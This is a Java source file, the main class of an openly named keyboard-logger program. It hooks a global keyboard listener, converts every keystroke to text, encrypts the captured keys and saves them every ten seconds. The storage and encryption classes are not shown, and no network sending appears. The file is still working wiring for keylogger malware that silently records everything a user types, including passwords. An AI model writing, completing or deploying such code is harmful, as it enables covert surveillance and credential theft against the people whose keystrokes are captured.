package com.keytracker;


import com.keytracker.encrypt.Encryptor;
import com.keytracker.encrypt.KeyGen;
import de.ksquared.system.keyboard.GlobalKeyListener;

import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public class KeyboardLoggerApp {
    public static void main(String[] args) {
        KeyAppender keyAppender = new KeyAppender();
        MechanismsFactory mechanismsFactory = new MechanismsFactory(new ArgsResolver(args));
        StoreMechanism storeMechanism = mechanismsFactory.getStoreMechanism();
        Encryptor encryptor = mechanismsFactory.getEncryptor(new KeyGen());
        storeMechanism.registerAppender(keyAppender);
        storeMechanism.registerEncryptor(encryptor);

        KeyListenerImpl keyListener = new KeyListenerImpl(new AsciToStringKeyResolver(new CharactersProvider()), keyAppender);
        new GlobalKeyListener().addKeyListener(keyListener);

        Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate(storeMechanism::store, 10, 10, TimeUnit.SECONDS);
//        shutdownHook(storeMechanism);
    }

    private static void shutdownHook(StoreMechanism fileStoreMechanism) {
        Runtime.getRuntime().addShutdownHook(new Thread(fileStoreMechanism::store, "Shutdown-thread"));
    }
}